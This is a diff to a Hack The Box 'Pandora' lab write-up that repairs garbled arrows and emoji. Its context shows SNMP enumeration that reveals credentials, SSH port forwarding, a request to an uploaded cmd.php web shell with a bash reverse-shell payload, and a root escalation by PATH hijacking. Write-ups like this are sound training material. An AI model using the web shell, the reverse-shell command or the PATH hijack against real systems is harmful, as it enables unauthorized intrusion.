@@ -116,8 +116,8 @@ whatweb http://10.10.11.136
 ![whatweb](screenshots/whatweb.png)
 
 Interesting findings:
-- Domain â†’ `panda.htb`
-- Emails â†’ `contact@panda.htb`, `support@panda.htb`, `example@yourmail.com`
+- Domain → `panda.htb`
+- Emails → `contact@panda.htb`, `support@panda.htb`, `example@yourmail.com`
 
 Browsing main page:
 
@@ -139,8 +139,8 @@ gobuster dir -u http://panda.htb/ -w /usr/share/seclists/Discovery/Web-Content/d
 ![gobuster](screenshots/gobuster.png)
 
 Results:
-- `/assets/` â†’ Directory listing but nothing useful  
-- `/server-status/` â†’ Forbidden  
+- `/assets/` → Directory listing but nothing useful  
+- `/server-status/` → Forbidden  
 
 ![directory_listing_assets](screenshots/directory_listing_assets.png)  
 ![directory_listing_server_status](screenshots/directory_listing_server_status.png)
@@ -158,7 +158,7 @@ sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136
 
 ![nmap_udp](screenshots/nmap_udp.png)
 
-Port `161/udp` open â†’ **SNMP**.
+Port `161/udp` open → **SNMP**.
 
 Deep scan:
 
@@ -169,8 +169,8 @@ sudo nmap -sUCV -p161 10.10.11.136 -oN UDPScan
 ![udpscan_analysis](screenshots/udpscan_analysis.png)
 
 Interesting findings:
-- UID 835 â†’ User **Debian**
-- UID 1100 â†’ Credentials: `daniel // HotelBabylon23`
+- UID 835 → User **Debian**
+- UID 1100 → Credentials: `daniel // HotelBabylon23`
 
 ![udpscan_credentials](screenshots/udpscan_credentials.png)
 
@@ -226,7 +226,7 @@ ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 
 - `-L 80:127.0.0.1:80` tells SSH to bind our local port **80** to the remote service listening on **127.0.0.1:80** inside the victim.
 
-- This means that **any request to http://127.0.0.1:80 on our attacking machine will be transparently forwarded to the targetâ€™s Pandora Console service**.
+- This means that **any request to http://127.0.0.1:80 on our attacking machine will be transparently forwarded to the target’s Pandora Console service**.
 
 - In other words, the remote port 80 is **replicated locally**, allowing us to browse the internal-only web application as if it were running on our own host.
 
@@ -286,7 +286,7 @@ http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%2
 
 ![pandora_console_netcat](screenshots/pandora_console_netcat.png)
 
-âœ… **User flag obtained**  
+✅ **User flag obtained**  
 ![user_flag](screenshots/user_flag.png)
 
 ---
@@ -330,7 +330,7 @@ ltrace ./usr/bin/pandora_backup
 
 ![pandora_backup_code](screenshots/pandora_backup_code.png)
 
-Finds `tar` called with **relative path** â†’ vulnerable to **path hijacking**.
+Finds `tar` called with **relative path** → vulnerable to **path hijacking**.
 
 Exploit:
 
@@ -346,21 +346,21 @@ echo $PATH
 ![tar_file](screenshots/tar_file.png)  
 ![path_hijacking](screenshots/path_hijacking.png)
 
-ðŸ **Root flag obtained**  
+🏁 **Root flag obtained**  
 ![root_flag](screenshots/root_flag.png)
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
 
-1. **SNMP Enumeration** â†’ Extracted credentials (`daniel:HotelBabylon23`).  
-2. **SSH Access** â†’ Logged in as daniel.  
-3. **Local Port Forwarding** â†’ Exposed internal Pandora Console.  
-4. **SQL Injection** â†’ Hijacked admin session.  
-5. **File Upload RCE** â†’ Achieved reverse shell as matt.  
-6. **Path Hijacking** â†’ Exploited `pandora_backup` to escalate to root.  
+1. **SNMP Enumeration** → Extracted credentials (`daniel:HotelBabylon23`).  
+2. **SSH Access** → Logged in as daniel.  
+3. **Local Port Forwarding** → Exposed internal Pandora Console.  
+4. **SQL Injection** → Hijacked admin session.  
+5. **File Upload RCE** → Achieved reverse shell as matt.  
+6. **Path Hijacking** → Exploited `pandora_backup` to escalate to root.  
 
 ---
 ## Defensive Recommendations
